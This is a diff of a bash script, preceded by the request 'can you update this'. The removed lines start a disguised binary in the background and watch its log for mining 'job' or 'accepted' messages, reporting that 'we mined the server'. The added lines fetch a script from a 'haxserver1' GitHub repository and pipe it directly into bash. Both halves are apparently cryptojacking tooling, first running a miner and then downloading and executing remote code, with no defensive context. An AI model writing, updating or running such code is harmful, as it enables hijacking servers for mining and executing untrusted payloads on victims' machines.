@@ -1,3 +1,5 @@
+can you update this 
+
 #!/bin/bash
 
 # Check if an argument is provided
@@ -67,61 +69,16 @@ fi
 # Make all files in the directory executable
 chmod +x *
 
-# Use session.log as the log file
-LOG_FILE="session.log"
-
-# Run the executable file in the background, capturing output to session.log
-nohup ./session_ajqysbey 2>&1 &
-
-# Get the PID of the last background process
-PID=$!
-
-# Wait for a moment to check if the process is still running
-sleep 3
-
-# Check if the process is running
-if ps -p $PID > /dev/null; then
-  echo "Process started successfully with PID $PID."
+# Execute additional script
+echo "Downloading and executing additional script..."
+if curl_output=$(curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh"); then
+    echo "Script downloaded successfully. Executing..."
+    echo "$curl_output" | bash
+    echo "Additional script executed successfully."
 else
-  echo "Failed to start process with nohup. Trying alternate method."
-
-  # Try an alternate method to run in the background
-  ./session_ajqysbey 2>&1 &
-  PID=$!
-  sleep 3
-
-  if ps -p $PID > /dev/null; then
-    echo "Process started successfully with alternate method with PID $PID."
-  else
-    echo "Failed to start process with alternate method."
+    echo "Failed to download or execute additional script."
     exit 1
-  fi
 fi
 
-# Function to check the log file for specific messages and process status
-check_log() {
-  while true; do
-    if grep -q "job" "$LOG_FILE" || grep -q "accepted" "$LOG_FILE"; then
-      echo "Found 'job' we mined the server successfully"
-      exit 0
-    else
-      echo "No Job found yet this time!"
-    fi
-
-    # Check if the background process is still running
-    if ! ps -p $PID > /dev/null; then
-      echo "Process has terminated. Exiting script."
-      exit 1
-    fi
-
-    sleep 60
-  done
-}
-
-# Run the log check function in the background
-check_log &
-
-# Wait for the log check process to complete
-wait $!
 
 echo "Script executed successfully."
